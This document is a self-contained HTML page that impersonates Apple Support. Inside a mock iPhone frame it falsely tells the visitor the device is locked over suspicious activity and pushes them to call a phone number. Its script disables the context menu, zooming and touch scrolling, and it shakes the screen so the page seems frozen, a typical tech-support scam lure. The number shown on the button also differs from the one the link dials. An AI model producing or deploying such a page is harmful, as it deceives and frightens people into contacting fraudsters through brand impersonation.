<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Apple Support</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            touch-action: none;
        }
        
        .iphone {
            width: 375px;
            height: 812px;
            background-color: #000;
            border-radius: 50px;
            border: 12px solid #333;
            position: relative;
            overflow: hidden;
            pointer-events: none;
        }
        
        .notch {
            width: 40%;
            height: 30px;
            background-color: #000;
            position: absolute;
            top: 0;
            left: 30%;
            border-bottom-left-radius: 15px;
            border-bottom-right-radius: 15px;
            z-index: 10;
        }
        
        .screen {
            width: 100%;
            height: 100%;
            background-color: #000;
            position: relative;
            overflow: hidden;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 10px 25px;
            color: white;
            font-size: 14px;
        }
        
        .time {
            font-weight: bold;
        }
        
        .lock-screen {
            display: none;
            flex-direction: column;
            align-items: center;
            color: white;
            height: 100%;
        }
        
        .support-page {
            position: absolute;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            padding-top: 50px;
            box-sizing: border-box;
            overflow-y: auto;
        }
        
        .support-header {
            background-color: #f5f5f7;
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #e1e1e1;
        }
        
        .support-content {
            padding: 20px;
        }
        
        .support-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        
        .support-text {
            font-size: 16px;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        .call-button {
            display: block;
            width: 100%;
            padding: 15px;
            background-color: #0071e3;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 500;
            text-align: center;
            margin-top: 20px;
            cursor: pointer;
            pointer-events: auto;
        }
        
        .call-button:hover {
            background-color: #0062c3;
        }
        
        .apple-logo {
            width: 30px;
            height: 30px;
            margin-bottom: 10px;
        }
        
        .freeze-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000;
            pointer-events: none;
        }
        
        .unresponsive {
            animation: unresponsive 0.5s infinite;
        }
        
        @keyframes unresponsive {
            0% { transform: translateX(0); }
            25% { transform: translateX(-2px); }
            50% { transform: translateX(0); }
            75% { transform: translateX(2px); }
            100% { transform: translateX(0); }
        }
    </style>
</head>
<body>
    <div class="iphone unresponsive">
        <div class="notch"></div>
        <div class="screen">
            <div class="status-bar">
                <div class="time" id="current-time">9:41</div>
                <div class="icons">
                    <span>üì∂</span>
                    <span>üîã</span>
                </div>
            </div>
            
            <div class="support-page" id="support-page">
                <div class="support-header">
                    <svg class="apple-logo" viewBox="0 0 24 24" fill="#000">
                        <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                    </svg>
                    <h2>Apple Support</h2>
                </div>
                
                <div class="support-content">
                    <h3 class="support-title">‚ö†Ô∏è Device Unresponsive</h3>
                    <p class="support-text">Your device has been locked due to security reasons. The system has detected suspicious activity.</p>
                    <p class="support-text">Please contact Apple Support immediately to unlock your device and secure your account.</p>
                    
                    <button class="call-button" onclick="callSupport()">Call Apple Support: +1-888-123-1234</button>
                </div>
            </div>
        </div>
    </div>

    <div class="freeze-overlay"></div>

    <script>
        // Disable context menu
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
        // Disable zooming
        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });
        
        // Update time (but freeze after first load)
        function updateTime() {
            const now = new Date();
            document.getElementById('current-time').textContent = now.toLocaleTimeString([], {hour: 'numeric', minute: 'numeric'});
        }
        updateTime();
        
        // Make the call button the only interactive element
        function callSupport() {
            window.location.href = 'tel:+1888121234';
        }
        
        // Add subtle unresponsive animation
        setInterval(function() {
            document.querySelector('.iphone').classList.toggle('unresponsive');
        }, 3000);
        
        // Prevent any touch events except the call button
        document.addEventListener('touchmove', function(e) {
            if (e.target.className !== 'call-button') {
                e.preventDefault();
            }
        }, { passive: false });
    </script>
</body>
</html>
